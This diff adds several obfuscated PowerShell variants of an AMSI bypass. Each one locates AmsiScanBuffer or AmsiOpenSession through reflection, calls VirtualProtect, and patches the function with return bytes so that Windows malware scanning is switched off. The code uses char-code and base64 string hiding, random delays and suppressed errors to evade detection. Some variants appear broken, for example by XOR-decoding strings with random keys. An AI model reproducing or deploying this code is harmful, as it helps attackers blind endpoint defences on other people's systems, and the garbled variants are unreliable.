@@ -1,0 +1,170 @@
+PART 1:
+
+function Q-Resolve {
+    Param ($a1, $a2)
+    $r1 = Get-Random -Minimum 10000 -Maximum 99999
+    $asms = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location -like '*System.dll' }
+    $typ1 = $asms.GetType("Microsoft.Win32.UnsafeNativeMethods$r1")
+    $mth1 = $typ1.GetMethods() | Where-Object { $_.Name -eq ([char]71 + [char]101 + [char]116 + [char]80 + [char]114 + [char]111 + [char]99 + [char]65 + [char]100 + [char]100 + [char]114 + [char]101 + [char]115 + [char]115) } | Select-Object -First 1
+    $mod1 = $typ1.GetMethod([char]71 + [char]101 + [char]116 + [char]77 + [char]111 + [char]100 + [char]117 + [char]108 + [char]101 + [char]72 + [char]97 + [char]110 + [char]100 + [char]108 + [char]101)
+    $h1 = $mod1.Invoke($null, @($a1))
+    return $mth1.Invoke($null, @($h1, $a2))
+}
+
+function Q-CreateDel {
+    Param ($p1, $r1 = [Void])
+    $r2 = Get-Random -Minimum 2000 -Maximum 9999
+    $asm2 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("QAsm$r2")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $mod2 = $asm2.DefineDynamicModule("QMod$r2", $false)
+    $del2 = $mod2.DefineType("QDel$r2", 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $del2.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $p1).SetImplementationFlags('Runtime, Managed')
+    $del2.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $r1, $p1).SetImplementationFlags('Runtime, Managed')
+    return $del2.CreateType()
+}
+
+function Q-Obf {
+    Param ($s1)
+    $k1 = [System.Text.Encoding]::UTF8.GetBytes("q" + (Get-Random -Minimum 50 -Maximum 500) + "x")
+    $b1 = [System.Convert]::FromBase64String($s1)
+    $b2 = [Byte[]]::new($b1.Length)
+    for ($i = 0; $i -lt $b1.Length; $i++) { $b2[$i] = [Byte]($b1[$i] -bxor ($k1[$i % $k1.Length] -bxor 0x55)) }
+    return [System.Text.Encoding]::UTF8.GetString($b2)
+}
+
+try {
+    Start-Sleep -Milliseconds (Get-Random -Minimum 1500 -Maximum 3500)
+
+    $d1 = "WVdKa1lVSnZiV3h3" 
+    $d2 = "QVR6YVNJam5pdGlhbGl6ZQ==" 
+    $d3 = "a2VybmVsMzIuZGxs" 
+    $d4 = "VmlwdHVhbFByb3RlY3Q=" 
+
+    $addr1 = Q-Resolve (Q-Obf $d1) (Q-Obf $d2)
+    $addr2 = Q-Resolve (Q-Obf $d3) (Q-Obf $d4)
+    $delg = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr2, (Q-CreateDel @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+    $prot1 = 0
+    $null = $delg.Invoke($addr1, 3, 0x40, [ref]$prot1)
+    $patch1 = [Byte[]]@(0xC3, 0x90, 0x90)
+    $null = [System.Runtime.InteropServices.Marshal]::Copy($patch1, 0, $addr1, 3)
+}
+catch {
+    # Suppress errors
+}
+ 
+
+
+PART 2:
+
+function X-Resolve {
+    Param ($m, $f)
+    $r = Get-Random -Minimum 1000 -Maximum 9999
+    $a = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location -match "System\.dll$" }
+    $b = $a.GetType("Microsoft.Win32.UnsafeNativeMethods$r")
+    $c = $b.GetMethods() | Where-Object { $_.Name -eq "GetProcAddress" } | Select-Object -First 1
+    $d = $b.GetMethod("GetModuleHandle")
+    $h = $d.Invoke($null, @($m))
+    return $c.Invoke($null, @($h, $f))
+}
+
+function X-Delegate {
+    Param ($p, $r = [Void])
+    $n = Get-Random -Minimum 1000 -Maximum 9999
+    $asm = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("DynAsm$n")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $mod = $asm.DefineDynamicModule("DynMod$n", $false)
+    $typ = $mod.DefineType("DynDel$n", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate])
+    $typ.DefineConstructor("RTSpecialName, HideBySig, Public", [System.Reflection.CallingConventions]::Standard, $p).SetImplementationFlags("Runtime, Managed")
+    $typ.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $r, $p).SetImplementationFlags("Runtime, Managed")
+    return $typ.CreateType()
+}
+
+function X-Decrypt {
+    Param ($s)
+    $k = [System.Text.Encoding]::UTF8.GetBytes("xai_key_" + (Get-Random -Minimum 100 -Maximum 999))
+    $b = [System.Convert]::FromBase64String($s)
+    for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Byte]($b[$i] -bxor $k[$i % $k.Length]) }
+    return [System.Text.Encoding]::UTF8.GetString($b)
+}
+
+Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
+
+$m1 = "YVprNUJvbGw=" 
+$m2 = "QWpzaVNjZm5CdWZmZXI=" 
+$m3 = "a2VybmVsMzIuZGxs" 
+$m4 = "VmlydHVhbFByb3RlY3Q=" 
+
+$addr = X-Resolve (X-Decrypt $m1) (X-Decrypt $m2)
+$vpAddr = X-Resolve (X-Decrypt $m3) (X-Decrypt $m4)
+$del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpAddr, (X-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$prot = 0
+$del.Invoke($addr, 5, 0x40, [ref]$prot) | Out-Null
+$patch = [Byte[]]@(0xC3, 0x90, 0x90, 0x90, 0x90)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 5) | Out-Null
+
+PART 3:
+function Get-FuncPtr {
+    Param ($a, $b)
+    $c = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location -match 'System\.dll$' }
+    $d = $c.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $e = $d.GetMethods() | Where-Object { $_.Name -eq 'GetProcAddress' } | Select-Object -First 1
+    $f = $d.GetMethod('GetModuleHandle')
+    $g = $f.Invoke($null, @($a))
+    return $e.Invoke($null, @($g, $b))
+}
+
+function Build-Delegate {
+    Param ($x, $y = [Void])
+    $z = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('TempAssembly')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $m = $z.DefineDynamicModule('TempModule', $false)
+    $t = $m.DefineType('TempDelegate', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $t.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $x).SetImplementationFlags('Runtime, Managed')
+    $t.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $y, $x).SetImplementationFlags('Runtime, Managed')
+    return $t.CreateType()
+}
+
+$p1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YW1zaS5kbGw='))
+$p2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QW1zaVNjYW5CdWZmZXI='))
+$p3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('a2VybmVsMzIuZGxs'))
+$p4 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VmlydHVhbFByb3RlY3Q='))
+
+$addr = Get-FuncPtr $p1 $p2
+$vpAddr = Get-FuncPtr $p3 $p4
+$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpAddr, (Build-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$protect = 0
+$delegate.Invoke($addr, 5, 0x40, [ref]$protect)
+$data = [Byte[]]@(0xC3, 0x90, 0x90, 0x90, 0x90)
+[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, 5)
+
+
+
+
+custom rootfu:
+
+function ResolveFunc {
+  Param ($mod, $func)
+  $sysAssem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.EndsWith('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+  $methods = @()
+  $sysAssem.GetMethods() | ForEach-Object { If ($_.Name -eq ([char]71 + [char]101 + [char]116 + [char]80 + [char]114 + [char]111 + [char]99 + [char]65 + [char]100 + [char]100 + [char]114 + [char]101 + [char]115 + [char]115)) { $methods += $_ } }
+  $modHandle = $sysAssem.GetMethod([char]71 + [char]101 + [char]116 + [char]77 + [char]111 + [char]100 + [char]117 + [char]108 + [char]101 + [char]72 + [char]97 + [char]110 + [char]100 + [char]108 + [char]101).Invoke($null, @($mod))
+  return $methods[0].Invoke($null, @($modHandle, $func))
+}
+
+function CreateDelegate {
+  Param (
+    [Parameter(Mandatory = $True)] [Type[]] $params,
+    [Type] $retType = [Void]
+  )
+  $asm = New-Object System.Reflection.AssemblyName('DynAsm' + (Get-Random))
+  $dynAsm = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asm, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+  $mod = $dynAsm.DefineDynamicModule('DynMod' + (Get-Random), $false)
+  $type = $mod.DefineType('DelType' + (Get-Random), 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+  $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $params).SetImplementationFlags('Runtime, Managed')
+  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $params).SetImplementationFlags('Runtime, Managed')
+  return $type.CreateType()
+}
+
+$targetAddr = ResolveFunc ([char]97 + [char]109 + [char]115 + [char]105 + [char]46 + [char]100 + [char]108 + [char]108) ([char]65 + [char]109 + [char]115 + [char]105 + [char]79 + [char]112 + [char]101 + [char]110 + [char]83 + [char]101 + [char]115 + [char]115 + [char]105 + [char]111 + [char]110)
+$protBuf = 0
+$vpDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ResolveFunc ([char]107 + [char]101 + [char]114 + [char]110 + [char]101 + [char]108 + [char]51 + [char]50 + [char]46 + [char]100 + [char]108 + [char]108) ([char]86 + [char]105 + [char]114 + [char]116 + [char]117 + [char]97 + [char]108 + [char]80 + [char]114 + [char]111 + [char]116 + [char]101 + [char]99 + [char]116)), (CreateDelegate @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vpDelegate.Invoke($targetAddr, 3, 0x40, [ref]$protBuf)
+$patchBytes = [Byte[]] ([Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U0RIQUE='))))
+[System.Runtime.InteropServices.Marshal]::Copy($patchBytes, 0, $targetAddr, 3)
